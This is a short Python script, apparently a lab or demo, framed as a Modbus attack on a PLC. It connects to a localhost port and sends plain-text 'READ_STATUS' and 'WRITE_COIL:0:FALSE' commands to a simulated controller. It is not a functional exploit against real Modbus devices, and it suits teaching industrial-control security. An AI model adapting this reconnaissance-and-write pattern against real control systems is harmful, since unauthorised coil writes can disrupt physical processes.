import socket
import time

def launch_attack():
    host = '127.0.0.1'
    port = 5020
    
    print("\n[+] Inicializando vector de ataque Modbus...")
    time.sleep(1)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # 1. Reconocimiento
        print("[*] Enviando solicitud de estado: READ_STATUS")
        s.send(b"READ_STATUS")
        respuesta = s.recv(1024).decode()
        print(f"[📡] Respuesta del PLC: {respuesta}")
        
        time.sleep(1.5)
        
        # 2. Inyección de comando crítico
        print("[🔥] INYECTANDO PAYLOAD MALICIOSO -> WRITE_COIL:0:FALSE")
        s.send(b"WRITE_COIL:0:FALSE")
        
        s.close()
        print("[✓] Ataque ejecutado. Conexión cerrada.")
        
    except Exception as e:
        print(f"[X] No se pudo conectar al PLC: {e}")
    
    # Cierre interactivo inmediato
    print("\n" + "="*50)
    input("👉 Presiona ENTER una sola vez para CERRAR esta terminal...")

if __name__ == "__main__":
    launch_attack()